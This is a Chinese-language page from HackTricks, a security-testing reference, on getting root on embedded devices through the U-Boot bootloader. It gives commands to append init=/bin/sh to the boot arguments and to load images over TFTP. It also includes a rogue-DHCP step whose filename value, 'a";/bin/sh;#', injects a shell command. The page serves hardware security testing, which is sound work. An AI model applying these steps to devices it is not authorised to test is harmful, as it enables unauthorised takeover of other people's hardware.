<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter**上关注我 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

推荐以下步骤来修改设备启动配置和引导加载程序（如U-boot）：

1. **访问引导加载程序的解释器Shell**：
- 在启动过程中，按下"0"、空格或其他已识别的"魔术代码"以访问引导加载程序的解释器Shell。

2. **修改引导参数**：
- 执行以下命令将 '`init=/bin/sh`' 追加到引导参数中，允许执行shell命令：
%%%
#printenv
#setenv bootargs=console=ttyS0,115200 mem=63M root=/dev/mtdblock3 mtdparts=sflash:<partitiionInfo> rootfstype=<fstype> hasEeprom=0 5srst=0 init=/bin/sh
#saveenv
#boot
%%%

3. **设置TFTP服务器**：
- 配置TFTP服务器以通过本地网络加载镜像：
%%%
#setenv ipaddr 192.168.2.2 #设备的本地IP
#setenv serverip 192.168.2.1 #TFTP服务器IP
#saveenv
#reset
#ping 192.168.2.1 #检查网络访问
#tftp ${loadaddr} uImage-3.6.35 #loadaddr接受要加载文件的地址和TFTP服务器上镜像的文件名
%%%

4. **使用 `ubootwrite.py`**：
- 使用 `ubootwrite.py` 写入U-boot镜像并推送修改后的固件以获取root访问权限。

5. **检查调试功能**：
- 验证是否启用了调试功能，如详细日志记录、加载任意内核或从不受信任的来源引导。

6. **谨慎的硬件干扰**：
- 在设备启动过程中连接一个引脚到地线并与SPI或NAND闪存芯片交互时要小心，特别是在内核解压缩之前。在短接引脚之前，请参考NAND闪存芯片的数据表。

7. **配置恶意DHCP服务器**：
- 设置一个带有恶意参数的恶意DHCP服务器，供设备在PXE引导期间摄取。利用诸如Metasploit的（MSF）DHCP辅助服务器之类的工具。修改'FILENAME'参数，使用命令注入命令，例如 `'a";/bin/sh;#'`，以测试设备启动过程的输入验证。

**注意**：涉及与设备引脚进行物理交互的步骤（*用星号标记）应谨慎对待，以避免损坏设备。


## 参考资料
* [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
